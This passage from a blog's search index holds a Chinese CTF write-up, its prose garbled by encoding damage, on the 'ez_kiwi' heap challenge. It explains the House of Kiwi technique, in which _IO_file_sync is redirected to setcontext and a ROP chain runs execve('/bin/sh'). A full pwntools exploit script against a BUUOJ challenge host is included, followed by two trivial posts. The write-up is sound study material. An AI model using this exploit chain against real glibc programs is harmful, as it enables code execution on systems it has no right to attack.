<span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¼šä¿®æ”¹tcacheçš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘<code>__malloc_hook</code>å’Œ<code>__free_hook</code>,å†æ¬¡ç”³è¯·æ—¶å°±ä½¿ç”¨systemæˆ–è€…one_gadgetå»å¡«å……è¯¥åœ°å€ã€‚ä½†æ˜¯è¿™é¢˜æ•…æ„ä¸è®©ä½ å»è¿™æ ·å»ä½¿ç”¨ï¼Œæ¯æ¬¡é‡æ–°å¼€å§‹å¾ªç¯æ—¶ä¼šè°ƒç”¨clearå‡½æ•°å°†<code>__malloc_hook</code>å’Œ<code>__free_hook</code>å…¨éƒ¨é‡ç½®ä¸º0ã€‚</p><img src="/img/1/2.png"  /><p><img src="/img/1/3.png"></p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨house of kiwiè¿™ç§æ–¹å¼ï¼Œä¿®æ”¹<code>_IO_file_sync</code>å’Œ<code>_IO_helper_jumps</code>ä¸­çš„å€¼ã€‚</p><p>å…·ä½“è¿‡ç¨‹ä¾¿æ˜¯è§¦å‘<code>__malloc_assert</code>åï¼Œå»æ‰§è¡Œfflush (stderr)ï¼Œä¼šä½¿ç”¨<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sync</code>ï¼ŒRDXå¯„å­˜å™¨çš„å€¼ä¸º<code>IO_helper_jumps</code>æŒ‡é’ˆ,RDXå§‹ç»ˆæ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€ã€‚</p><img src="/img/1/5.png"><p>ç„¶å<strong>é€šè¿‡ setcontext æ§åˆ¶å¯„å­˜å™¨çš„å€¼</strong>ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f38b563d0dd</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]#åˆ©ç”¨ä»£ç <br>   <span class="hljs-number">0x00007f38b563d0e4</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f38b563d0eb</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f38b563d0ef</span> &lt;+<span class="hljs-number">79</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f38b563d0f3</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f38b563d0f7</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f38b563d0fb</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f38b563d0ff</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x00007f38b563d10b</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7f38b563d1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>   â€¦â€¦â€¦â€¦<br>   â€¦â€¦â€¦â€¦<br>   <span class="hljs-number">0x00007f38b563d1c6</span> &lt;+<span class="hljs-number">294</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]#åˆ©ç”¨ä»£ç <br>   <span class="hljs-number">0x00007f38b563d1cd</span> &lt;+<span class="hljs-number">301</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f38b563d1ce</span> &lt;+<span class="hljs-number">302</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f38b563d1d2</span> &lt;+<span class="hljs-number">306</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f38b563d1d6</span> &lt;+<span class="hljs-number">310</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f38b563d1dd</span> &lt;+<span class="hljs-number">317</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f38b563d1e1</span> &lt;+<span class="hljs-number">321</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f38b563d1e5</span> &lt;+<span class="hljs-number">325</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f38b563d1ec</span> &lt;+<span class="hljs-number">332</span>&gt;:   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f38b563d1ee</span> &lt;+<span class="hljs-number">334</span>&gt;:   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®<code>rdx + 0xa0</code>æ¥æ§åˆ¶rspï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶äº†æ ˆçš„åœ°å€ï¼Œé€šè¿‡æœ€åçš„retæŒ‡ä»¤å°±å¯ä»¥æ‰§è¡ŒROPã€‚</p><p>æ”»å‡»æµç¨‹å¦‚ä¸‹</p><p>å°†<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sync</code>ä¿®æ”¹ä¸º<code>setcontext + 61</code>çš„åœ°å€ï¼Œè®©ç¨‹åºæ‰§è¡Œsetcontextä¸­çš„ä»£ç ï¼›åŒæ—¶ä¿®æ”¹<code>_IO_helper_jumps + 0xa0 å’Œ _IO_helper_jumps + 0xa8</code>åˆ†åˆ«å­˜æ”¾æœ‰ROPçš„ä½ç½®å’ŒretæŒ‡ä»¤çš„gadgetä½ç½®ã€‚é¢˜ç›®æä¾›äº†libcæ–‡ä»¶ï¼Œåªéœ€åœ¨libcä¸­æ‰¾åˆ°ç›¸åº”çš„gadgetå†åŠ ä¸Šlibcçš„åŸºåœ°å€å³å¯ï¼Œå¯ä»¥é€šè¿‡æ³„æ¼å †çš„åœ°å€æ¥å­˜æ”¾gadgetã€‚</p><h3 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h3><p>å…³äºIO_helper_jumpsçš„åœ°å€å¯»æ‰¾ï¼šç”±äºpwntoolsæ— æ³•ä»æ–‡ä»¶ç›´æ¥å¾—åˆ°IO_helper_jumpsçš„ä¿¡æ¯ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡è¿™é“é¢˜æä¾›çš„libcæ–‡ä»¶åˆ©ç”¨idaä¸­æ‰¾åˆ°åç§»ï¼›ä½†å¦‚æœæ˜¯ä»pwndbgä¸­å¯»æ‰¾ï¼Œæ‰¾åˆ°çš„åœ°å€å¹¶ä¸æ˜¯<code>_IO_file_sync</code>ä¸­æ‰€åˆ©ç”¨çš„é‚£ä¸ªåœ°å€ï¼Œå¯¹æ¯”ä¸‹å›¾å’Œä¸Šå›¾å°±ä¼šå‘ç°éœ€è¦-0xc0æ‰æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„åœ°å€ã€‚</p><p><img src="/img/1/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br></code></pre></td></tr></table></figure><p> åˆ©ç”¨0x20å¤§å°çš„å †å—é‡å ï¼Œå¯ä»¥ä¿®æ”¹tcacheä¸­çš„fdæŒ‡é’ˆï¼Œå°±å¯å¯¹<code>IO_file_jumps</code>çš„åœ°å€ä¿®æ”¹ï¼Œå¹¶æ³„æ¼å †çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ROPgadget æ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œåˆ©ç”¨ç³»ç»Ÿè°ƒç”¨å»æ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL) ï¼ˆå‚¨å­˜&#x2F;bin&#x2F;shçš„åœ°å€è‡ªå·±æ‰¾å¥½åç§»å³å¯ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><p>ç»§ç»­åˆ©ç”¨0x20å¤§å°çš„å †å—é‡å ï¼Œå»ä¿®æ”¹<code>_IO_helper_jumps + 0xa0 å’Œ _IO_helper_jumps + 0xa8</code>ä¸­çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br></code></pre></td></tr></table></figure><p>å…³äºè§¦å‘<code>__malloc_assert</code>ï¼šåœ¨top chunkä¸å¤Ÿä½¿ç”¨æ—¶å°±ä½¿ç”¨sysmallocï¼ŒåŒæ—¶å¯¹top chunkè¿›è¡Œä¸€ç³»åˆ—æ£€æŸ¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸æ˜¯ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œè€Œæ˜¯æ•…æ„è®©å…¶ä¸èƒ½é€šè¿‡æ£€æŸ¥ã€‚è¿™é‡Œæ”¹å˜top chunkçš„å¤§å°ï¼Œä½¿å…¶ä¸èƒ½é¡µå¯¹é½ï¼Œå¹¶ä½¿ç”¨gift()å‡½æ•°ç”³è¯·0x25000å¤§å°çš„å †å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br></code></pre></td></tr></table></figure><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ez_kiwi&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ez_kiwi&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27690</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;give me your name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How much do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to put?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Tell me your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to look?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to change?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Change your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br><br>leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br><span class="hljs-comment">#add(0x80, 9, b&#x27;a&#x27;)</span><br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p> å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/Hello-world/"/>
    <url>/2022/11/01/Hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/31/2022-10-31/"/>
    <url>/2022/10/31/2022-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="2022-10-31"><a href="#2022-10-31" class="headerlink" title="2022-10-31"></a>2022-10-31</h2><p><strong>Happy halloween</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
